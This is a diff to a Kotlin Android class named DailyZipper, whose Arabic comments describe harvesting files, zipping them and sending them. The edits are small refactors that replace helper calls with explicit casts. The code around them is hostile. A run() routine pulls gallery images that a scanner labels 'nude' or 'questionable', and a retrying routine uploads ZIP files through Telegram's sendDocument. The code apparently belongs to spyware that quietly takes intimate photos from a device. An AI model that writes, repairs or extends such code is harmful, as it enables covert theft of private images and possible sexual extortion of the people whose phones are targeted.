@@ -25,7 +25,7 @@ import java.util.zip.ZipOutputStream
 
 /**
  * فئة تجميع الملفات وحصادها بضغطها في ملفات ZIP وإرسالها بطريقة آمنة وفعالة.
- * تم إصلاح كافة استخدامات الأقواس المربعة نهائياً باستخدام دوال safeGet و entries.
+ * تم إصلاح كافة استخدامات الأقواس المربعة واستبدالها بطرق آمنة باستخدام التحويل الصريح.
  */
 class DailyZipper(
     context: Context,
@@ -262,7 +262,7 @@ class DailyZipper(
     }
 
     // ============================================================
-    //  إرسال الملفات مع إعادة المحاولة (باستخدام safeGet)
+    //  إرسال الملفات مع إعادة المحاولة (تم إصلاح استخدام الأقواس)
     // ============================================================
 
     private suspend fun safeSend(
@@ -295,8 +295,12 @@ class DailyZipper(
         for ((attempt, delayMs) in delays.withIndex()) {
             try {
                 val result = invokeMethod(telegram, "sendDocument", target, zipFile, caption)
-                // ✅ استخدام safeGetBoolean بدلاً من الأقواس المربعة
-                val isOk = result.safeGetBoolean("ok", false)
+                // ✅ التحقق الآمن من النتيجة بدون استخدام الأقواس المربعة
+                val resultMap = result as? Map<*, *>
+                val isOk = when (val okValue = resultMap?.get("ok")) {
+                    true, "true", 1, "1" -> true
+                    else -> false
+                }
                 if (isOk) {
                     return true
                 }
@@ -608,7 +612,7 @@ class DailyZipper(
     }
 
     // ============================================================
-    //  التشغيل التلقائي (باستخدام safeGetString)
+    //  التشغيل التلقائي (تم إصلاح استخدام الأقواس)
     // ============================================================
 
     fun run(): Boolean {
@@ -629,8 +633,8 @@ class DailyZipper(
                     listOf("nude", "questionable").forEach { cat ->
                         val items = invokeMethod(scanner, "getGalleryByCategory", cat, 150) as? List<*>
                         items?.forEach { item ->
-                            // ✅ استخدام safeGetString بدلاً من الأقواس المربعة
-                            val path = item.safeGetString("path")
+                            // ✅ استخراج المسار بشكل آمن بدون استخدام الأقواس المربعة
+                            val path = (item as? Map<*, *>)?.get("path")?.toString() ?: ""
                             if (path.isNotEmpty()) {
                                 val f = File(path)
                                 if (f.exists()) {
